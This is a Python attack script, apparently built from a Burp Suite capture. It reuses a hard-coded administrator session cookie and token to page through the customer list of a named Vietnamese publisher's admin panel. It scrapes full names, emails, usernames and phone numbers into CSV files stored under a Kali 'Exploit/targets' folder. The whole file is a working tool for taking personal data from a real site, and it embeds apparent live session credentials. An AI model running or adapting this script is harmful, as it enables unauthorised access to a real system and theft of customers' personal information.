import requests

burp0_cookies = {"_ga": "GA1.1.979575979.1671699148", "__utma": "101260126.979575979.1671699148.1671699149.1674052454.2", "__utmz": "101260126.1674052454.2.2.utmcsr=admin.nxbxaydung.com.vn|utmccn=(referral)|utmcmd=referral|utmcct=/", "_ga_N8ET2NGNWQ": "GS1.1.1674052453.2.0.1674052455.58.0.0", "__RequestVerificationToken": "eYw7sKP5u4fsc2jnVdNBehNisy8JUkygkDNC-BeawLASXV_y1m88WOy1C44hoDE4Do1loGe2Amyko0PXntSfJW3n5FdFWCrAMRp63_TXMoU1",
                 ".AUTH": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoIjoiNmZlNjg5YzU5N2FkNGQxMTg2ZDliYTcxZTc2NWYwM2IiLCJ0aW1lIjoiMjMwMTE5MDc1NDIzIiwibmJmIjoxNjc0MDg5NjYzLCJleHAiOjE2NzQ2OTQ0NjMsImlhdCI6MTY3NDA4OTY2M30.GSxVEg4t_zviJho5EpNni1xBXuukHAl2ygzUpjlJphM"}
burp0_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Linux\"", "Origin": "https://admin.nxbxaydung.com.vn", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://admin.nxbxaydung.com.vn/Customer", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}

import requests, re, os
from datetime import datetime
from bs4 import BeautifulSoup
import pandas as pd

now = datetime.now() # current date and time
root_folder = "/home/kali/Downloads/Exploit/BXD/targets/nxbxaydung/"
datas = []
for i in range(1601, 1940): 
	# request
	burp0_url = "https://admin.nxbxaydung.com.vn:443/Customer/ListItem?record=15&Page={0}".format(i)
	x = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

	soup = BeautifulSoup(x.text, 'html.parser')
	table = soup.find(id="datatable")
	
	trs = table.find_all('tr')[1:]
	for tr in trs:
		tds = tr.find_all('td')
		full_name = tds[1].text
		email = tds[2].text
		username = tds[3].text
		phone_number = tds[4].text
		print(full_name, email, username, phone_number)
		datas.append([full_name, email, username, phone_number])
	if i%100 == 0:
		pd.DataFrame(datas, columns=['full_name', 'email', 'username', 'phone_number']).to_csv(os.path.join(root_folder, "customer_info_{0}.csv".format(i)), index=False)
		del datas
		datas = []	
	print('Page processed', i)
